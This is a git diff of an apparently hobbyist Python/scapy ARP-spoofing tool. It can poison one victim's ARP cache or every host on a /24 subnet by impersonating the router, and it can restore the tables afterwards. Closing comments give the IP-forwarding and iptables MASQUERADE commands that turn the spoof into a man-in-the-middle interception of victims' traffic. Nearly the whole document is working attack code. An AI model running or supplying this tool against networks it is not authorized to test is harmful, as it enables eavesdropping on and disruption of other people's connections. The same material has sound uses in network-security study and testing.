@@ -1,277 +1,223 @@
 import sys
 import time
 import argparse
-from scapy.all import ARP, Ether, srp1, sendp, get_if_hwaddr, srp
-
 import threading
-#adding this for brute forcing
-
-iface = "wlp2s0"  # change if needed
-
-
-#OK NEW IDEA DO THE RESTORE LIKE IVE BEEN SPOOFING
-#BUT only send for a short duration instead of potentially forever
-def brute_force_restore_all(spoofed_ip):
-
-    duration = 10
-
-    spoofed_mac = get_mac(spoofed_ip)
-    #router mac
+#threading for the brute force restore = one thread per IP all blasting at once SUPER QUICK
+from scapy.all import ARP, Ether, srp1, sendp, srp
 
 
-    if not spoofed_mac:
-        print(f"failed to get MAC for {spoofed_ip}")
-        return
+#─── ARGS ─────────────────────────────────────────────────────────────────────
+#putting argparse up here so iface is available to ALL functions
+parser = argparse.ArgumentParser()
+parser.add_argument("spoofed_ip", nargs="?", help="IP to impersonate (usually the router)")
+parser.add_argument("target_ip", nargs="?", help="Victim IP (leave out if using --all)")
+parser.add_argument("--iface", default="eth1", help="Network interface to use")
+parser.add_argument("--restore", action="store_true", help="Restore a single target's ARP table")
+parser.add_argument("--all", action="store_true", help="Spoof every device on the subnet")
+parser.add_argument("--restore-all", action="store_true", help="Restore every device on the subnet")
+args = parser.parse_args()
 
-    print(f"brute-forcing restore for all devices on subnet as {spoofed_ip} for {duration} seconds...")
-
-    subnet_prefix = '.'.join(spoofed_ip.split('.')[:3]) + '.'
-    #same logic so 192.168.1.
-
-    stop_time = time.time() + duration
-    #so when we reach 5 seconds from now end it
-
-
-
-    def restore_loop(ip):
-        mac = get_mac(ip)
-        #get the mac of the threads IP
-        while time.time() < stop_time:
-            if mac:
-                restore_arp(ip, mac, spoofed_ip, spoofed_mac)
-            time.sleep(1)
-            #sleeping means giving up the GIL therefore another thread can run
-            #after hte 1 second shouldnt interrupt but instead go back in the queeu
-
-
-    threads = []
-
-    for i in range(2, 255):
-        ip = subnet_prefix + str(i)
-        #get full IP from concatenation
-
-        if ip == spoofed_ip:
-            continue
-            #skpi router
-
-        t = threading.Thread(target=restore_loop, args=(ip,))
-        #ip, to make a tuple
-
-        #we create a thread per IP (~250 threads)
-        #we are NOT running all 250 threads at the exact same time.
-
-        #python has something called the GIL (Global Interpreter Lock).
-        #this means:
-        # - only one thread runs Python bytecode at a time.
-        # - so CPU-bound code doesn't run in parallel
-
-        #BUT in this case (restore_arp and getmac) we're doing network I/O and sleep calls:
-        # - sendp(pkt) is I/O-bound (sending network packets)
-        # - time.sleep(2) pauses the thread (releases the GIL)
-
-        #so while one thread sleeps or waits on I/O,
-        #another thread can run — concurrency, not true parallelism.
-
-        #CPU-bound = tasks that use the processor a lot (math, compression, etc.)
-        #I/O-bound = tasks that wait for something external (network, disk, input)
-
-
-        t.start()
-        #starts each
-
-        threads.append(t)
-        #adds them to the list so we know when all are done
-
-    for t in threads:
-        t.join()
-
-    print("restore all complete")
-
+iface = args.iface
+#pulled out into a variable sonot typing args.iface everywhere
+# ──────────────────────────────────────────────────────────────────────────────
 
 
 def get_mac(ip):
+    #send a broadcast ARP asking "who has this IP tell me your MAC"
+    #srp1 (send recieve packets) sends and gets the first reply alot cleaner than srp for single targets
     pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
     resp = srp1(pkt, timeout=0.5, iface=iface, verbose=False)
     return resp[Ether].src if resp else None
-    #send ARP out asking to all whos IP this is and get their MAC
+
+
 
 def restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac):
-    #so my phone doesnt have to wait ages to restore its own tables
-    #ofc assuming im not forwarding
+    #send a REAL ARP reply to fix the victims poisoned table
+    #op=2 means ARP reply (not request)
     pkt = Ether(dst=target_mac) / ARP(
         op=2,
         psrc=spoofed_ip,
         hwsrc=spoofed_mac,
+        #the REAL mac this time
         pdst=target_ip,
         hwdst=target_mac
     )
-    sendp(pkt, iface=iface, count=5, verbose=False)
-    #sends my phone a packet saying what the routers IP and shit is
+    sendp(pkt, iface=iface, count=15, verbose=False)
+    #send it a few times to make sure it works
 
+
+def start_spoofer(spoofed_ip, target_ip):
+    #single target spoof
+    target_mac = get_mac(target_ip)
+    spoofed_mac = get_mac(spoofed_ip)
+    #get both MACs first so can restore properly later
+
+    print(f"Target MAC:  {target_mac}")
+    print(f"Spoofed MAC: {spoofed_mac}")
+
+    if not target_mac:
+        print(f"[-] Could not get MAC for {target_ip} turn it on")
+        sys.exit(1)
+
+    print(f"[+] Spoofing {target_ip} = telling them we are {spoofed_ip}")
+
+    try:
+        while True:
+            #keep blasting fake ARP replies every 2 seconds
+            #ARP tables expire so have to keep refreshing the lie
+            pkt = Ether(dst=target_mac) / ARP(
+                op=2,
+                psrc=spoofed_ip,
+                #pretending to be the router
+                pdst=target_ip,
+                hwdst=target_mac
+            )
+            sendp(pkt, iface=iface, verbose=False)
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        print("\n[+] Spoofing stopped. Restoring ARP table...")
+        restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
+        #clean up but only for terminal
 
 
 def spoof_all(spoofed_ip):
-
-    subnet_prefix = "192.168.1."
-    #set up the starting prefix
+    #spray fake ARP replies at every possible IP on the subnet
+    #derived from spoofed_ip so it works on any subnet
+    subnet_prefix = '.'.join(spoofed_ip.split('.')[:3]) + '.'
+    #e.g. 192.168.56.1 → "192.168.56."
 
     spoofed_mac = get_mac(spoofed_ip)
-    
-
     if not spoofed_mac:
-        print(f"could not get MAC for spoofed IP: {spoofed_ip}")
+        print(f"[-] Could not get MAC for {spoofed_ip}")
         return
 
-    print(f"spoofing all devices on subnet as {spoofed_ip}...")
+    print(f"[+] Spoofing all devices on {subnet_prefix}0/24 as {spoofed_ip}...")
 
-    while True:
-        try:
-            for i in range(2, 255):  #skip .0 (network) and .1 (router itself)
+    try:
+        while True:
+            for i in range(2, 255):
+                #skip .0 and .1
                 target_ip = subnet_prefix + str(i)
-                #so each POSSIBLE device send a ping saying im the router
                 if target_ip == spoofed_ip:
-                    continue  
-                #skip spoofing the router itself
+                    continue
+                #dont spoof what we wanna be
 
                 pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                     op=2,
                     psrc=spoofed_ip,
                     pdst=target_ip,
                     hwdst="ff:ff:ff:ff:ff:ff"
+                    #broadcast cuz dont know each targets MAC without scanning first
                 )
                 sendp(pkt, iface=iface, verbose=False)
-                #this is the ARP packet
 
-            time.sleep(2)  
-            #repeat every 2 seconds
-
-        except KeyboardInterrupt:
-            print("\nAll spoofing stopped. Restoring ARP tables...")
-            for i in range(2, 255):
-                target_ip = subnet_prefix + str(i)
-                if target_ip == spoofed_ip:
-                    continue  # skip restoring for the spoofed device itself
-                target_mac = get_mac(target_ip)
-                if target_mac:
-                    restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
-
-
-
-
-
-
-def start_spoofer(spoofed_ip, target_ip):
-    target_mac = get_mac(target_ip)
-    spoofed_mac = get_mac(spoofed_ip)
-    #get both MACs
-
-    print("Target MAC:", target_mac)
-    print("Spoofed MAC:", spoofed_mac)
-
-
-    if not target_mac:
-        print(f"[-] Could not get MAC for {target_ip}")
-        sys.exit(1)
-
-    print(f"[+] Spoofing {target_ip} as {spoofed_ip}")
-    try:
-        while True:
-            pkt = Ether(dst=target_mac) / ARP(
-                op=2,
-                psrc=spoofed_ip,
-                pdst=target_ip,
-                hwdst=target_mac
-            )
-            sendp(pkt, iface=iface, verbose=False)
             time.sleep(2)
-        #CONTINUSOULY spam the victim with fake ARP replies (op = 2)
-        #sayin "im the router"
-        #around every 2 seconds app
+            #wait 2 seconds then do it all again to keep the tables poisoned
 
     except KeyboardInterrupt:
-        print("\n[+] Spoofing stopped.")
-        restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
-        #stop it calls this with the args
+        print("\n[+] Stopping. Restoring ARP tables...")
+        for i in range(2, 255):
+            target_ip = subnet_prefix + str(i)
+            if target_ip == spoofed_ip:
+                continue
+            target_mac = get_mac(target_ip)
+            if target_mac:
+                restore_arp(target_ip, target_mac, spoofed_ip, spoofed_mac)
 
-#script run directly not imported
+
+
+def brute_force_restore_all(spoofed_ip):
+    #instead of asking each device nicely if theyre alive first,
+    #just blast restore packets at every IP on the subnet for 10 seconds
+
+    duration = 10
+
+    spoofed_mac = get_mac(spoofed_ip)
+    if not spoofed_mac:
+        print(f"[-] Could not get MAC for {spoofed_ip}")
+        return
+
+    subnet_prefix = '.'.join(spoofed_ip.split('.')[:3]) + '.'
+    stop_time = time.time() + duration
+
+    print(f"[+] Brute-force restoring all devices as {spoofed_ip} for {duration} seconds...")
+
+    def restore_loop(ip):
+        #each thread handles one IP, gets its MAC then keeps sending restores until times up
+        mac = get_mac(ip)
+        while time.time() < stop_time:
+            if mac:
+                restore_arp(ip, mac, spoofed_ip, spoofed_mac)
+            time.sleep(1)
+            #sleep releases the GIL so other threads can run during the wait
+
+    threads = []
+    for i in range(2, 255):
+        ip = subnet_prefix + str(i)
+        if ip == spoofed_ip:
+            continue
+
+        t = threading.Thread(target=restore_loop, args=(ip,))
+        #ip, as a tuple — needed for args= to work correctly
+
+        #~250 threads sounds scary but theyre all sleeping most of the time
+        #pythons GIL means only one runs at once anyway
+
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+        #wait for all threads to finish
+
+    print("[+] Restore complete.")
+
+
+
+#─── MAIN ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-
-    parser.add_argument("spoofed_ip", nargs="?", help="IP router")
-    parser.add_argument("target_ip", nargs="?", help="Victim IP (if not spoofing all)")
-    parser.add_argument("--restore", action="store_true", help="Restore single")
-    parser.add_argument("--all", action="store_true", help="Spoof all devices on subnet")
-    parser.add_argument("--restore-all", action="store_true", help="Restore all devices on subnet")
-
-    #adds the args
-    #added more
-
-    args = parser.parse_args()
-    #gets them
 
     if args.restore:
         if not args.spoofed_ip or not args.target_ip:
             print("Usage: python3 spoofer.py --restore <spoofed_ip> <target_ip>")
             sys.exit(1)
         spoofed_mac = get_mac(args.spoofed_ip)
-        target_mac = get_mac(args.target_ip)
+        target_mac  = get_mac(args.target_ip)
         restore_arp(args.target_ip, target_mac, args.spoofed_ip, spoofed_mac)
 
-
     elif args.restore_all:
-        #running thsi simpler and more brute forcy like my spoofer as this wasnt great before not all things were responding to the ARP requests for scan live hosts
-        #now ill just brute force it
         if not args.spoofed_ip:
-            print("Usage: python3 spoofer.py --restore-all <spoofed_ip>")
+            print("Usage: python3 spoofer.py <spoofed_ip> --restore-all")
             sys.exit(1)
         brute_force_restore_all(args.spoofed_ip)
-
-
 
     elif args.all:
         if not args.spoofed_ip:
             print("Usage: python3 spoofer.py <spoofed_ip> --all")
             sys.exit(1)
         spoof_all(args.spoofed_ip)
-        #self explanatory
 
     else:
         if not args.spoofed_ip or not args.target_ip:
             print("Usage: python3 spoofer.py <spoofed_ip> <target_ip>")
             sys.exit(1)
         start_spoofer(args.spoofed_ip, args.target_ip)
-        #this is a single spoof
 
 
 
-#sudo sysctl -w net.ipv4.ip_forward=1
-#sudo iptables -t nat -A POSTROUTING -o wlp2s0 -j MASQUERADE
-#for forwarding
-
-#sudo sysctl -w net.ipv4.ip_forward=0
-
-
-
-#so for example my phone wants to ping 8.8.8.8 -> sends packet to router 192.168.1.1
-#BUT due to spoofing the MAC address for 192.168.1.1 points to my laptop (not the real router)
-
-#therefore the packet still has a destination of 8.8.8.8 
-#it arrives at my laptop because its impersonating the router at the MAC layer
-
-#the forward command enables packet forwarding
-#this allows my laptop to forward that packet out to the real router
-
-#the packet is now on its way to 8.8.8.8 as normal (sent from my laptop)
-
-
-
-#the iptables MASQUERADE rule rewrites the source IP of the packet before it leaves my laptop
-#it replaces my phone's IP (e.g. 192.168.1.181) with my laptop's own IP 
-#this makes the router think the request came from my laptop, not from my phone
-
-#why? because if i didn't do this the router would try to reply directly to the phone
-#but the phone thinks it's talking to the router (not the real one) so the return packet would skip us
-
-#MASQUERADE ensures the router replies come back to us (the spoofing laptop)
-#then we forward those replies back to the phone (again pretending to be the router)
-
+#─── HOW THE MITM FORWARDING WORKS ───────────────────────────────────────────
+#once spoofing, the victim sends all traffic to us thinking we're the router
+#to actually forward it (so they stay connected) run these first:
+#
+#   sudo sysctl -w net.ipv4.ip_forward=1
+#   sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
+#
+#ip_forward tells linux to forward packets instead of dropping them
+#MASQUERADE rewrites the source IP to ours before sending to the real router
+#that way the router replies to us, and we forward back to the victim
+#without MASQUERADE the router would reply directly to the victim and skip us entirely
+#
+#to turn forwarding off when done:
+#   sudo sysctl -w net.ipv4.ip_forward=0
+# ──────────────────────────────────────────────────────────────────────────────
